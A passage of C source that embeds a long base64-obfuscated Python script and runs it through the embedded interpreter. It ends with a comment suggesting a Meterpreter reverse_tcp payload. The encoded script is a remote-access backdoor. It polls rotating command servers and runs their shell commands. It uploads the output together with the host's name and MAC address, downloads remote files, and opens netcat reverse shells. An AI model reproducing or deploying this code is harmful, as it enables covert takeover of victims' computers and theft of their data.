bnNlW2lmaW5kKzU6c3Jlc3BvbnNlLmZpbmQoJ3x8JyxpZmluZCldCiAgICAgICAgICAgICAgICAgICAgICAgICAgaWZpbmQ9c3Jlc3BvbnNlLmZpbmQoJ2V4ZWM9JykKICAgICAgICAgICAgICAgICAgICAgICAgICBzZXhlYyA9IHNyZXNwb25zZVtpZmluZCs1OnNyZXNwb25zZS5maW5kKCd8fCcsaWZpbmQpXQogICAgICAgICAgICAgICAgICAgICAgICAgIGlmaW5kPXNyZXNwb25zZS5maW5kKCdjbWQ9JykKICAgICAgICAgICAgICAgICAgICAgICAgICBzY21kID0gc3Jlc3BvbnNlW2lmaW5kKzQ6c3Jlc3BvbnNlLmZpbmQoJ3x8JyxpZmluZCldCiAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgc2tpbGwKICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICNodHRwU2Vydi5jbG9zZSgpCiAgICAgICAgICAgICAgaWYgc2V4ZWMgPT0gJzEnOgogICAgICAgICAgICAgICAgICAgICAgc0NPTVBVVEVSTkFNRT1vcy5nZXRlbnYoJ0NPTVBVVEVSTkFNRScpKyJfIitzbWFjYWRkcmVzcwogICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNvdXQgPT0gJzEnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZHVtcD1zdWJwcm9jZXNzLmNoZWNrX291dHB1dChzY21kLHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCwgc2hlbGw9VHJ1ZSkKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZXNzPXN1YnByb2Nlc3MuUG9wZW4oc2NtZCxzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCwgc2hlbGw9VHJ1ZSkKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwID0gUG9wZW4oc2NtZCxzaGVsbD1UcnVlKQogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybmNvZGUgPSBwcm9jZXNzLndhaXQoKQogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCdyZXR1cm4gY29kZScuZm9ybWF0KHJldHVybmNvZGUpKQogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNkdW1wPXByb2Nlc3Muc3Rkb3V0LnJlYWQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZXh0X2ZpbGUgPSBvcGVuKG9zLmdldGVudignVEVNUCcpKyJcXCIgKyBzQ09NUFVURVJOQU1FLCAidyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRleHRfZmlsZS53cml0ZShzZHVtcCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGV4dF9maWxlLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZXMgPSB7J3VzZXJmaWxlJzogb3Blbihvcy5nZXRlbnYoJ1RFTVAnKSsiXFwiICsgc0NPTVBVVEVSTkFNRSwgJ3JiJyl9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwOi8vJyArIHNpdGUgKycvdXBsb2FkLnBocCcsZmlsZXM9ZmlsZXMpICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI2lmIGxlbihzZHVtcCk8MjAwNjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI3NkdW1wID0gc2R1bXAucmVwbGFjZSgiXCciLCAiIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI3NkdW1wID0gc2R1bXAucmVwbGFjZSgiXFwiLCAiXFxcXCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNkdW1wID0gc2R1bXAucmVwbGFjZSgiXHJcbiIsICI8YnI+IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI3NkdW1wID0gc2R1bXAucmVwbGFjZSgiXG4iLCAiPGJyPiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNzZHVtcCA9IHNkdW1wLnJlcGxhY2UoIlxyIiwgIjxicj4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZHVtcCA9IHNkdW1wLnJlcGxhY2UoIiAiLCAiJTIwIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI3NkdW1wID0gc2R1bXBbIDAgOiAyMDA1XQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjaHR0cFNlcnYgPSBodHRwbGliLkhUVFBDb25uZWN0aW9uKHNpdGUsIDgwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjaHR0cFNlcnYuY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNyZXNwb25zZSA9IHVybGxpYjIudXJsb3BlbigiaHR0cDovLyIrc2l0ZSsiL3N2Yy93dXAucGhwP3BjPSIrc0NPTVBVVEVSTkFNRSsiJmR1bXA9IitzZHVtcCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI2h0dHBTZXJ2LnJlcXVlc3QoJ0dFVCcsICIvc3ZjL3d1cC5waHA/cGM9IitzQ09NUFVURVJOQU1FKyImZHVtcD0iK3NkdW1wKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjcmVzcG9uc2UgPSBodHRwU2Vydi5nZXRyZXNwb25zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybCA9ICJodHRwOi8vIitzaXRlKyIvc3ZjL3d1cC5waHA/cGM9IitzQ09NUFVURVJOQU1FKyImZHVtcD0iK3NkdW1wCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNodHRwU2Vydi5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWdldGZpbGU9c2NtZC5maW5kKCdnZXRmaWxlJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWZpbGU9c2NtZC5yZmluZCgnLycpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGlnZXRmaWxlPT0wOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2V0dXJsID1zY21kWzg6bGVuKHNjbWQpXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZmlsZWRlc3Q9IHNjbWRbaWZpbGUrMTpsZW4oc2NtZCldCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYgPSB1cmxsaWIyLnVybG9wZW4oZ2V0dXJsKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKHN3aW4rJ1xcJysgc2ZpbGVkZXN0LCAid2IiKSBhcyBjb2RlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvZGUud3JpdGUoZi5yZWFkKCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwID0gUG9wZW4oc2NtZCxzaGVsbD1UcnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICNwcmludCByLnRleHQKICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24sZToKICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCBzdHIoZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAjbXlsb29wKCkKICAgICAgICAgICAgICAgICAgICAgICNodHRwU2VydiA9IGh0dHBsaWIuSFRUUENvbm5lY3Rpb24oc2l0ZSwgODApCiAgICAgICAgICAgICAgICAgICAgICAjaHR0cFNlcnYuY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgICAjcmVzcG9uc2UgPSB1cmxsaWIyLnVybG9wZW4oImh0dHA6Ly8iK3NpdGUrIi9zdmMvd3VwLnBocD9wYz0iK3NDT01QVVRFUk5BTUUrIiZleGVjPTAiKQogICAgICAgICAgICAgICAgICAgICAgI2h0dHBTZXJ2LnJlcXVlc3QoJ0dFVCcsICIvc3ZjL3d1cC5waHA/cGM9IitzQ09NUFVURVJOQU1FKyImZXhlYz0wIikKICAgICAgICAgICAgICAgICAgICAgICNyZXNwb25zZSA9IGh0dHBTZXJ2LmdldHJlc3BvbnNlKCkKICAgICAgICAgICAgICAgICAgICAgIHVybCA9ICJodHRwOi8vIitzaXRlKyIvc3ZjL3d1cC5waHA/cGM9IitzQ09NUFVURVJOQU1FKyImZXhlYz0wIgogICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhlYWRlcikKICAgICAgICAgICAgICAgICAgICAgICNodHRwU2Vydi5jbG9zZSgpCiAgICAgICAgICAgICAgaWYgc2tpbGwgPT0gJzAnOgogICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cygnYzpcd2luZG93c1xzeXN3b3c2NCcpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcCA9IFBvcGVuKCJuYy5leGUgLWUgY21kLmV4ZSAiK3NpcCsiICIrc3BvcnQsc2hlbGw9VHJ1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNvcy5zeXN0ZW0oIm5jLmV4ZSAtZSBjbWQuZXhlICIrc2lwKyIgIitzcG9ydCkKICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcCA9IFBvcGVuKCJuYzY0LmV4ZSAtZSBjbWQuZXhlICIrc2lwKyIgIitzcG9ydCxzaGVsbD1UcnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI29zLnN5c3RlbSgibmM2NC5leGUgLWUgY21kLmV4ZSAiK3NpcCsiICIrc3BvcnQpCiAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uLGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgc3RyKGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgI215bG9vcCgpCiAgICAgICAgICAgICAgICAgICAgICAjaHR0cFNlcnYgPSBodHRwbGliLkhUVFBDb25uZWN0aW9uKHNpdGUsIDgwKQogICAgICAgICAgICAgICAgICAgICAgI2h0dHBTZXJ2LmNvbm5lY3QoKQogICAgICAgICAgICAgICAgICAgICAgI3Jlc3BvbnNlID0gdXJsbGliMi51cmxvcGVuKCJodHRwOi8vIitzaXRlKyIvc3ZjL3d1cC5waHA/cGM9IitzQ09NUFVURVJOQU1FKyIma2lsbD0xIikKICAgICAgICAgICAgICAgICAgICAgICNodHRwU2Vydi5yZXF1ZXN0KCdHRVQnLCAiL3N2Yy93dXAucGhwP3BjPSIrc0NPTVBVVEVSTkFNRSsiJmtpbGw9MSIpCiAgICAgICAgICAgICAgICAgICAgICAjcmVzcG9uc2UgPSBodHRwU2Vydi5nZXRyZXNwb25zZSgpCiAgICAgICAgICAgICAgICAgICAgICB1cmwgPSAiaHR0cDovLyIrc2l0ZSsiL3N2Yy93dXAucGhwP3BjPSIrc0NPTVBVVEVSTkFNRSsiJmtpbGw9MSIKICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXIpCiAgICAgICAgICAgICAgICAgICAgICAjaHR0cFNlcnYuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgCiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsaWVudCA9IHBhcmFtaWtvLlNTSENsaWVudCgpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGllbnQuc2V0X21pc3NpbmdfaG9zdF9rZXlfcG9saWN5KHBhcmFtaWtvLkF1dG9BZGRQb2xpY3koKSkKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI2xhYmVsIC5teUxhYmVsCiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICN0cnk6CiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNzaXAgPSAnMTg0LjcyLjg5Ljc0JwogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGllbnQuY29ubmVjdChzaXAsIHVzZXJuYW1lPSdyb290JywgcGFzc3dvcmQ9J3Rvb3InLHBvcnQ9aW50KHNwb3J0KSkKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoYW4gPSBjbGllbnQuZ2V0X3RyYW5zcG9ydCgpLm9wZW5fc2Vzc2lvbigpCiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFuLnNlbmQoJ0hleSBpIGFtIGNvbm5lY3RlZCA6KSAnKQogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgY2hhbi5yZWN2KDEwMjQpCiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSBjaGFuLnJlY3YoMTAyNCkKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCBzdHIobGVuKGNvbW1hbmQpKQogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50IGNvbW1hbmQKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBjb21tYW5kID09ICdleGl0JyBvciBsZW4oY29tbWFuZCkgPT0gMDoKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsaWVudC5jbG9zZSgpCiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDTUQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChjb21tYW5kLCBzaGVsbD1UcnVlKQogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFuLnNlbmQoQ01EKQogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24sZToKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhbi5zZW5kKHN0cihlKSkKICAgICAgIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbixlOgogICAgICAjIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgc3RyKGUpCiAgICAgICAgICAgICAgc2l0ZT1zaXRlMQogICAgICBleGNlcHQgRXhjZXB0aW9uLGU6CiMgICAgICAgICAgICAgIGFwcF9sb2cuaW5mbygnRXhjZXB0aW9uICVzJyxzdHIoZSkpCiAgICAgICAgICAgICAgcHJpbnQgc3RyKGUpCiAgICAgICAgICAgICAgI3ByaW50IGUuZXJybm8KICAgICAgICAgICAgICAjaWYgZS5lcnJubyA9PSAxMTAwMTogCiAgICAgICAgICAgICAgdGltZS5zbGVlcCgxMCkgCiAgICAgICAgICAgICAgI215bG9vcCgpICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgIGlmIHNpdGUgPT0gc2l0ZTE6CiAgICAgICAgICAgICAgICAgIHNpdGU9c2l0ZTIKICAgICAgICAgICAgICBlbGlmIHNpdGUgPT0gc2l0ZTI6CiAgICAgICAgICAgICAgICAgIHNpdGU9c2l0ZTMKICAgICAgICAgICAgICBlbGlmIHNpdGUgPT0gc2l0ZTM6CiAgICAgICAgICAgICAgICAgIHNpdGU9c2l0ZTEKICAgICAgICAgICAgICAKI3RpbWUuc2xlZXAoMTApCndoaWxlIFRydWU6CiAgdHJ5OgogICAgIG15bG9vcCgpIAogICAgIHRpbWUuc2xlZXAoNjApCiAgZXhjZXB0IEV4Y2VwdGlvbixlOgogICAgIHByaW50IHN0cihlKSAKICAgICB0aW1lLnNsZWVwKDYwKQogICAgIG15bG9vcCgpICAgICAgCgo=')))");
  
  PyObject* PyFileObject = PyFile_FromString("intro.py", "r");
  PyRun_SimpleFileEx(PyFile_AsFile(PyFileObject), "intro.py", 1);
  
  //char filename[] = "intro.py";
  //FILE* fp;

  

  //fp = Py_fopen(filename, "r");
  //PyRun_SimpleFile(fp, filename);
  
   /* write here your python meterpreter payload : msfvenom --payload=python/meterpreter/reverse_tcp LHOST=192.168.0.28 LPORT=4444 */
  Py_Finalize();  
}
